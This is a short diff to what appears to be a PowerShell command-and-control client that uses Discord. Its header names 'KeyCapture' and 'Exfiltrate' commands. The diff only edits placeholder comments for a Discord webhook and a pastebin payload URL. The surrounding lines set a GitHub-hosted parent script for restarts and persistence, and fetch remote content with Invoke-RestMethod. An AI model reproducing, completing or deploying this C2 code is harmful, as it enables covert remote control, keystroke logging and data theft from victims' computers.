@@ -42,10 +42,10 @@ Edit file contents to 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and re
 #>
 
 # Uncomment the lines below and add your details
-# $hookurl = "YOUR WEBHOOK URL"
-# $GHurl = "YOUR FILE URL" 
+# $hookurl = "YOUR_WEBHOOK_URL" # eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
+# $GHurl = "YOUR_FILE_URL"  # eg. https://pastebin.com/raw/QtCxxxx
 
-# $CCurl = "YOUR SECONDARY FILE URL"  # (optional)
+# $CCurl = "YOUR_SECONDARY_FILE_URL"  # (optional)
 
 $parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $response = Invoke-RestMethod -Uri $GHurl
